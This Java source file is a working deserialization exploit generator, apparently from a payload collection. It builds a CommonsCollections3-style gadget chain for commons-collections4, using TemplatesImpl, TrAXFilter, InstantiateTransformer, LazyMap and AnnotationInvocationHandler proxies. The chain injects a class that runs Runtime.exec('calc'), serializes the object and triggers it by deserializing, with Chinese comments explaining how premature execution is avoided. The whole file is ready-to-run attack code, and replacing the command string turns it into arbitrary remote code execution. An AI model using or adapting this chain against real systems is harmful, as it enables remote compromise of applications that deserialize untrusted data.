package org.payload.cc.CC3;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.*;

import static org.Tools.setClassPool.evilClass2;
import static org.Tools.setFieldValue.setFieldValue;
import static org.Tools.setSerial.serial;
import static org.Tools.setTemplatesImpl.template;

public class CommonsCollections3CC4TemplatesImpl {
    public static byte[] CommonsCollections3CommonsCollections4TemplatesImpl() throws Exception {
        byte[] evilClass = evilClass2("java.lang.Runtime.getRuntime().exec(\"calc\");");
        TemplatesImpl template = template(evilClass);
        System.out.println(template);
        //先设置假的transformers
        Transformer fakertransformer[] = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer transformers[] = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{template})
        };
        Transformer transformerChain = new ChainedTransformer(fakertransformer);

        Map  hp = new HashMap();
        Map evilMap = LazyMap.lazyMap(hp, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, evilMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler);
        //触发点是AnnotationInvocationHandler的readObject 所以还需要AnnotationInvocationHandler包装
        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
        //最后设置transformers避免前面执行时执行命令
        setFieldValue(transformerChain,"iTransformers", transformers);
        return serial(handler1);

    }
    public static void main(String[] args) throws Exception{
        byte[] barr = CommonsCollections3CommonsCollections4TemplatesImpl();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        ois.readObject();
    }
}
